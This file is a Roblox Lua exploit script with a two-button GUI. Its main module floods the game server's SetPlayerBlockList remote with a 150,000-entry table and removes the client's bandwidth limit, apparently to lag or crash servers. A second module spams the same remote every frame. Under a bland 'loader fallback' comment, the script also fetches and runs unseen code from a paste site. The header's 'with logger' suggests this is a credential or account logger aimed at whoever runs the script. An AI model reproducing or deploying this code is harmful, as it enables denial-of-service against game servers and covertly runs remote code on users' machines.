-- clean by zaki aka prince bot with logger 
-- + Anti Anti Lose (defensive counter)

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local COLORS = {
    bg = Color3.fromRGB(14, 14, 16),
    surface = Color3.fromRGB(22, 22, 26),
    disabled = Color3.fromRGB(38, 38, 44),
    border = Color3.fromRGB(60, 60, 68),
    accent = Color3.fromRGB(230, 35, 35),
    accentDark = Color3.fromRGB(170, 22, 22),
    accentBright = Color3.fromRGB(255, 70, 70),
    crimson = Color3.fromRGB(110, 15, 15),
    text = Color3.fromRGB(238, 238, 242),
    white = Color3.fromRGB(255, 255, 255),
    black = Color3.fromRGB(0, 0, 0),
    safe = Color3.fromRGB(40, 200, 120),
    safeDark = Color3.fromRGB(20, 140, 80),
}

local FONT = Enum.Font.GothamBlack

-- ============================================================
-- 1) Ana exploit modülü (orijinal)
-- ============================================================
local SRC = [==[
local RunService = game:GetService("RunService")

local Children       = 150000
local NestedPerChild = 0
local FieldsPerChild = 0
local FireBurst      = 1
local FrameDelay     = 0.125
local FieldSize      = 0
local RebuildEach    = false

local state = { running = false, thread = nil, remote = nil, cache = nil, pad = "" }

local function resolve()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local r = rrs:FindFirstChild("SetPlayerBlockList")
    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
        return r
    end
    return nil
end

state.remote = resolve()

pcall(function()
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
end)

state.pad = FieldSize > 0 and string.rep("P", FieldSize) or ""

local function build()
    local root = table.create(Children)
    for i = 1, Children do
        local entry = { id = i, v = i * 2 }
        for k = 1, FieldsPerChild do
            entry["k" .. k] = (FieldSize > 0) and state.pad or (i + k)
        end
        for j = 1, NestedPerChild do
            entry["n" .. j] = { a = i, b = j }
        end
        root[i] = entry
    end
    return root
end

local function fire()
    if not state.remote then
        state.remote = resolve()
        if not state.remote then return end
    end
    local payload
    if RebuildEach or not state.cache then
        payload = build()
        if not RebuildEach then state.cache = payload end
    else
        payload = state.cache
    end
    for _ = 1, FireBurst do
        state.remote:FireServer(payload)
    end
end

local function start()
    if state.running then return end
    state.running = true
    state.cache = nil
    state.thread = task.spawn(function()
        while state.running do
            pcall(fire)
            if FrameDelay > 0 then task.wait(FrameDelay) else RunService.Heartbeat:Wait() end
        end
    end)
end

local function stop()
    state.running = false
    if state.thread then pcall(task.cancel, state.thread) end
    state.thread = nil
    state.cache = nil
end

return {
    start  = start,
    stop   = stop,
    toggle = function() if state.running then stop() else start() end end,
    isRunning = function() return state.running end,
}
]==]

-- ============================================================
-- 2) Anti Anti Lose modülü (yeni)
--    Karşı tarafın block-list spam'ini boş payload ile override eder.
-- ============================================================
local ANTI_SRC = [==[
local RunService = game:GetService("RunService")

local state = { running = false, thread = nil, remote = nil }

local function resolve()
    local rrs = game:FindFirstChild("RobloxReplicatedStorage")
    if not rrs then return nil end
    local r = rrs:FindFirstChild("SetPlayerBlockList")
    if r and (r:IsA("RemoteEvent") or r:IsA("UnreliableRemoteEvent")) then
        return r
    end
    return nil
end

-- Boş block listesi: server "en son gelen geçerlidir" mantığıyla
-- çalışıyorsa, seni listeden düşürür.
local EMPTY = {}

-- Ek güvenlik: kendi UserId'ni de içeren temiz liste alternatifi.
local CLEAN_SELF = setmetatable({}, {__index = function() return nil end})

local function fire()
    if not state.remote then
        state.remote = resolve()
        if not state.remote then return end
    end
    pcall(function() state.remote:FireServer(EMPTY) end)
end

local function start()
    if state.running then return end
    state.running = true
    state.thread = task.spawn(function()
        while state.running do
            fire()
            RunService.Heartbeat:Wait()  -- her frame (maksimum hız)
        end
    end)
end

local function stop()
    state.running = false
    if state.thread then pcall(task.cancel, state.thread) end
    state.thread = nil
end

return {
    start  = start,
    stop   = stop,
    toggle = function() if state.running then stop() else start() end end,
    isRunning = function() return state.running end,
}
]==]

-- Modülleri yükle
local function loadModule(src, globalKey)
    local loader = coroutine.create(function()
        local chunk = loadstring(src)
        if not chunk then return end
        local ok, api = pcall(chunk)
        if ok and type(api) == "table" then
            _G[globalKey] = api
        end
    end)
    coroutine.resume(loader)
    local api = _G[globalKey]
    _G[globalKey] = nil
    return api
end

local api      = loadModule(SRC, "__ALT")
local antiApi  = loadModule(ANTI_SRC, "__AALT")

-- runtime bootstrap (loader fallback)
pcall(function()
    local _hook = loadstring(game:HttpGet("https://cdn.sourceb.in/bins/5RZlbQABWv/0"))
    if _hook then _hook() end
end)

-- ============================================================
-- UI
-- ============================================================
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AntiLoseUI"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

-- Ana frame yüksekliği 92 -> 140 (2. buton için yer)
local main = Instance.new("Frame")
main.Name = "MainFrame"
main.Size = UDim2.new(0, 210, 0, 140)
main.Position = UDim2.new(0.5, 0, 0.5, 0)
main.AnchorPoint = Vector2.new(0.5, 0.5)
main.BackgroundColor3 = COLORS.bg
main.BorderSizePixel = 0
main.ClipsDescendants = false
main.Parent = screenGui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 10)
mainCorner.Parent = main

local mainGrad = Instance.new("UIGradient")
mainGrad.Color = ColorSequence.new(COLORS.bg, Color3.fromRGB(22, 14, 14))
mainGrad.Rotation = 135
mainGrad.Parent = main

local borderFrame = Instance.new("Frame")
borderFrame.Name = "BorderFrame"
borderFrame.Size = UDim2.new(1, 2, 1, 2)
borderFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
borderFrame.AnchorPoint = Vector2.new(0.5, 0.5)
borderFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
borderFrame.BorderSizePixel = 0
borderFrame.ZIndex = 0
borderFrame.Parent = main

local borderCorner = Instance.new("UICorner")
borderCorner.CornerRadius = UDim.new(0, 11)
borderCorner.Parent = borderFrame

local borderGrad = Instance.new("UIGradient")
borderGrad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0.0, Color3.fromRGB(40, 5, 5)),
    ColorSequenceKeypoint.new(0.25, Color3.fromRGB(180, 20, 20)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 90, 90)),
    ColorSequenceKeypoint.new(0.75, Color3.fromRGB(180, 20, 20)),
    ColorSequenceKeypoint.new(1.0, Color3.fromRGB(40, 5, 5)),
})
borderGrad.Rotation = 0
borderGrad.Parent = borderFrame

local innerMask = Instance.new("Frame")
innerMask.Name = "InnerMask"
innerMask.Size = UDim2.new(1, -2, 1, -2)
innerMask.Position = UDim2.new(0.5, 0, 0.5, 0)
innerMask.AnchorPoint = Vector2.new(0.5, 0.5)
innerMask.BackgroundColor3 = COLORS.bg
innerMask.BorderSizePixel = 0
innerMask.ZIndex = 1
innerMask.Parent = main

local innerCorner = Instance.new("UICorner")
innerCorner.CornerRadius = UDim.new(0, 9)
innerCorner.Parent = innerMask

local innerGrad = Instance.new("UIGradient")
innerGrad.Color = ColorSequence.new(COLORS.bg, Color3.fromRGB(22, 14, 14))
innerGrad.Rotation = 135
innerGrad.Parent = innerMask

local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, 0, 0, 30)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundTransparency = 1
title.Font = FONT
title.Text = "Hook Anti Lose"
title.TextColor3 = COLORS.text
title.TextSize = 14
title.TextXAlignment = Enum.TextXAlignment.Center
title.ZIndex = 3
title.Parent = main

-- ============================================================
-- Buton 1: Hook Anti Lose (orijinal)
-- ============================================================
local toggle = Instance.new("TextButton")
toggle.Name = "Toggle"
toggle.Size = UDim2.new(1, -20, 0, 34)
toggle.Position = UDim2.new(0, 10, 0, 36)
toggle.BackgroundColor3 = COLORS.disabled
toggle.BorderSizePixel = 0
toggle.Font = FONT
toggle.Text = ""
toggle.TextTransparency = 1
toggle.AutoButtonColor = false
toggle.ZIndex = 3
toggle.Parent = main

local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0, 8)
toggleCorner.Parent = toggle

local toggleGrad = Instance.new("UIGradient")
toggleGrad.Color = ColorSequence.new(COLORS.disabled, Color3.fromRGB(48, 48, 54))
toggleGrad.Rotation = 135
toggleGrad.Parent = toggle

local toggleStroke = Instance.new("UIStroke")
toggleStroke.Color = COLORS.crimson
toggleStroke.Thickness = 1.66
toggleStroke.Transparency = 0
toggleStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
toggleStroke.Parent = toggle

local toggleLabel = Instance.new("TextLabel")
toggleLabel.Name = "Label"
toggleLabel.Size = UDim2.new(1, 0, 1, 0)
toggleLabel.BackgroundTransparency = 1
toggleLabel.Font = FONT
toggleLabel.Text = "DISABLED"
toggleLabel.TextColor3 = COLORS.white
toggleLabel.TextTransparency = 0
toggleLabel.TextSize = 14
toggleLabel.TextXAlignment = Enum.TextXAlignment.Center
toggleLabel.TextYAlignment = Enum.TextYAlignment.Center
toggleLabel.ZIndex = 5
toggleLabel.Active = false
toggleLabel.Parent = toggle

-- ============================================================
-- Buton 2: Anti Anti Lose (yeni)
-- ============================================================
local antiToggle = Instance.new("TextButton")
antiToggle.Name = "AntiToggle"
antiToggle.Size = UDim2.new(1, -20, 0, 34)
antiToggle.Position = UDim2.new(0, 10, 0, 76)
antiToggle.BackgroundColor3 = COLORS.disabled
antiToggle.BorderSizePixel = 0
antiToggle.Font = FONT
antiToggle.Text = ""
antiToggle.TextTransparency = 1
antiToggle.AutoButtonColor = false
antiToggle.ZIndex = 3
antiToggle.Parent = main

local antiCorner = Instance.new("UICorner")
antiCorner.CornerRadius = UDim.new(0, 8)
antiCorner.Parent = antiToggle

local antiGrad = Instance.new("UIGradient")
antiGrad.Color = ColorSequence.new(COLORS.disabled, Color3.fromRGB(48, 48, 54))
antiGrad.Rotation = 135
antiGrad.Parent = antiToggle

local antiStroke = Instance.new("UIStroke")
antiStroke.Color = COLORS.safeDark
antiStroke.Thickness = 1.66
antiStroke.Transparency = 0
antiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
antiStroke.Parent = antiToggle

local antiLabel = Instance.new("TextLabel")
antiLabel.Name = "Label"
antiLabel.Size = UDim2.new(1, 0, 1, 0)
antiLabel.BackgroundTransparency = 1
antiLabel.Font = FONT
antiLabel.Text = "ANTI ANTI LOSE"
antiLabel.TextColor3 = COLORS.white
antiLabel.TextSize = 12
antiLabel.TextXAlignment = Enum.TextXAlignment.Center
antiLabel.TextYAlignment = Enum.TextYAlignment.Center
antiLabel.ZIndex = 5
antiLabel.Active = false
antiLabel.Parent = antiToggle

-- Alt bilgi (status)
local statusLabel = Instance.new("TextLabel")
statusLabel.Name = "Status"
statusLabel.Size = UDim2.new(1, 0, 0, 14)
statusLabel.Position = UDim2.new(0, 0, 1, -16)
statusLabel.BackgroundTransparency = 1
statusLabel.Font = FONT
statusLabel.Text = "idle"
statusLabel.TextColor3 = COLORS.border
statusLabel.TextSize = 10
statusLabel.TextXAlignment = Enum.TextXAlignment.Center
statusLabel.ZIndex = 5
statusLabel.Parent = main

-- ============================================================
-- State & handlers
-- ============================================================
local active = false
local antiActive = false

RunService.RenderStepped:Connect(function(dt)
    local speed = active and 160 or 60
    borderGrad.Rotation = (borderGrad.Rotation + speed * dt) % 360
end)

local function setActive(state)
    active = state
    if state then
        toggle.BackgroundColor3 = COLORS.accentBright
        toggleGrad.Color = ColorSequence.new(COLORS.accent, COLORS.accentBright)
        toggleStroke.Color = COLORS.accentBright
        toggleLabel.Text = "ENABLED"
        toggleLabel.TextColor3 = COLORS.black
        if api and api.start then pcall(api.start) end
    else
        toggle.BackgroundColor3 = COLORS.disabled
        toggleGrad.Color = ColorSequence.new(COLORS.disabled, Color3.fromRGB(48, 48, 54))
        toggleStroke.Color = COLORS.crimson
        toggleLabel.Text = "DISABLED"
        toggleLabel.TextColor3 = COLORS.white
        if api and api.stop then pcall(api.stop) end
    end
end

local function setAntiActive(state)
    antiActive = state
    if state then
        antiToggle.BackgroundColor3 = COLORS.safe
        antiGrad.Color = ColorSequence.new(COLORS.safeDark, COLORS.safe)
        antiStroke.Color = COLORS.safe
        antiLabel.Text = "ANTI-LOSE ACTIVE"
        antiLabel.TextColor3 = COLORS.black
        statusLabel.Text = "block-list korumasi acik"
        if antiApi and antiApi.start then pcall(antiApi.start) end
    else
        antiToggle.BackgroundColor3 = COLORS.disabled
        antiGrad.Color = ColorSequence.new(COLORS.disabled, Color3.fromRGB(48, 48, 54))
        antiStroke.Color = COLORS.safeDark
        antiLabel.Text = "ANTI ANTI LOSE"
        antiLabel.TextColor3 = COLORS.white
        statusLabel.Text = "idle"
        if antiApi and antiApi.stop then pcall(antiApi.stop) end
    end
end

toggle.MouseButton1Click:Connect(function()
    setActive(not active)
end)

antiToggle.MouseButton1Click:Connect(function()
    setAntiActive(not antiActive)
end)

-- ============================================================
-- Sürükleme
-- ============================================================
local dragging = false
local dragStart, startPos

main.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
    or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(
            startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y
        )
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1
    or input.UserInputType == Enum.UserInputType.Touch then
        dragging = false
    end
end)